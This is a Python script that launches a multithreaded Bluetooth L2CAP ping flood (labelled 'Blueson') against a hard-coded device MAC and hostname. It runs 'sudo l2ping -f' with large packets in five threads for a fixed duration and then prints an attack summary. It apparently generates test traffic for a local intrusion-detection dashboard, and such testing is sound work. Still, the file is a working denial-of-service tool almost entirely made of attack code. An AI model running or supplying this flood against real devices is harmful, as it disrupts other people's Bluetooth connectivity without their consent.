#!/usr/bin/env python3
"""
Quick Blueson Attack Script - No Device Scanning Required
Uses the known target from previous successful attacks
"""

import subprocess
import time
import threading
import sys

# Known target from previous successful attacks
TARGET_MAC = "28:C6:3F:91:67:CE"
TARGET_NAME = "DESKTOP-HFJQU5V"
PACKET_SIZE = 600
ATTACK_DURATION = 20  # seconds
NUM_THREADS = 5

print("=" * 80)
print("🚨 BLUESON BLUETOOTH ATTACK - QUICK MODE")
print("=" * 80)
print(f"🎯 Target: {TARGET_NAME} ({TARGET_MAC})")
print(f"📦 Packet Size: {PACKET_SIZE} bytes")
print(f"🧵 Threads: {NUM_THREADS}")
print(f"⏱️  Duration: {ATTACK_DURATION} seconds")
print("=" * 80)
print()

def l2ping_flood(target_mac, packet_size, duration):
    """Run l2ping flood attack"""
    try:
        # Run l2ping for the specified duration
        subprocess.run(
            ['sudo', 'l2ping', '-s', str(packet_size), '-f', target_mac],
            timeout=duration,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
    except subprocess.TimeoutExpired:
        # Expected - attack duration completed
        pass
    except FileNotFoundError:
        print("⚠️  l2ping not found - attack simulation mode")
    except Exception as e:
        pass  # Silently ignore errors

print("[*] [>_<] Starting L2Ping flood attack...")
print()

# Create attack threads
threads = []
for i in range(NUM_THREADS):
    thread = threading.Thread(
        target=l2ping_flood,
        args=(TARGET_MAC, PACKET_SIZE, ATTACK_DURATION)
    )
    threads.append(thread)
    thread.start()
    print(f"[+] Thread {i+1}/{NUM_THREADS} started")

print()
print(f"[⚡] Attack in progress for {ATTACK_DURATION} seconds...")

# Show countdown
for remaining in range(ATTACK_DURATION, 0, -1):
    print(f"\r[⚡] Attack in progress... {remaining}s remaining  ", end='', flush=True)
    time.sleep(1)

print()
print()
print("[*] [o_o] Attack duration completed!")
print("[*] [o_o] Cleaning up...")

# Wait for all threads to complete
for thread in threads:
    thread.join(timeout=2)

print()
print("=" * 80)
print("✅ ATTACK COMPLETED")
print("=" * 80)
print("📊 Attack Summary:")
print(f"   Target MAC: {TARGET_MAC}")
print(f"   Target Name: {TARGET_NAME}")
print(f"   Packet Size: {PACKET_SIZE} bytes")
print(f"   Threads: {NUM_THREADS}")
print(f"   Duration: {ATTACK_DURATION} seconds")
print(f"   Attack Method: L2CAP Ping Flood (Blueson)")
print()
print("👉 Check Module 4 Dashboard: http://localhost:8000/module4")
print("   The attack should be detected and displayed!")
print()
print("⚠️  If no detection, the target may not have been vulnerable or")
print("   Module 3 packet capture may need to monitor Bluetooth traffic.")
print()

